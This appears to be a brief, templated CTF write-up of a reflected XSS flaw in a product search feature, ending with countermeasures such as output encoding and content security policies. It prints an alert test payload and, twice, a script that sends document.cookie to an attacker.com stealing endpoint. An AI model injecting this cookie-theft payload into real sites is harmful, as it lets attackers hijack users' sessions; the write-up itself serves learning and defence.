Title: Cross-Site Scripting (XSS) Vulnerability Exploitation
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: session cookie, input validation, output encoding, content security policies

#context
During a CTF competition, I encountered a web application that included a search feature allowing users to search for specific products. Given the potential security risks associated with cross-site scripting (XSS) vulnerabilities, I suspected that the application might be vulnerable to XSS attacks.

#discovery
To test for XSS, I entered a malicious payload containing a JavaScript script into the search parameter, such as <script>alert('XSS');</script>, which would cause the application to execute the JavaScript script on the client-side.

#exploitation
Upon submitting the payload, the application executed the JavaScript script, confirming the presence of an XSS vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the user's session cookie and impersonate the user.

#code
<script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</script>

#discovery
After researching the application's system and network configuration, I crafted a suitable payload containing a script that would steal the user's session cookie and send it to an attacker-controlled server, such as <script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</script>. This payload allowed me to steal the user's session cookie, impersonate the user, and gain access to the application's sensitive information.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using content security policies, and validating user input. By exploiting the vulnerability, I was able to steal the user's session cookie, impersonate the user, complete the Web Exploitation challenge, and demonstrate the potential risks associated with XSS.
